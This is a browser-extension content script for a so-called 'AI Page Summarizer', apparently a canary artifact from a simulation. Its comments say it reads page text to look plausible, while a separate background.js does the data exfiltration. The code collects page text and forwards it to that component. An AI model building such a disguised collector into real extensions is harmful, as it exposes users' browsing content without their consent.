// content.js — AI Page Summarizer
// CORTEXSIM-CANARY artifact. Reads the document body so the extension
// surface looks plausible; sends nothing on its own (background.js is
// the actual exfil path).

(function () {
    const summary = document.body ? document.body.innerText.slice(0, 256) : "";
    chrome.runtime.sendMessage({
        kind: "page_summary",
        marker: "CORTEXSIM-CANARY",
        sample: summary,
    });
})();
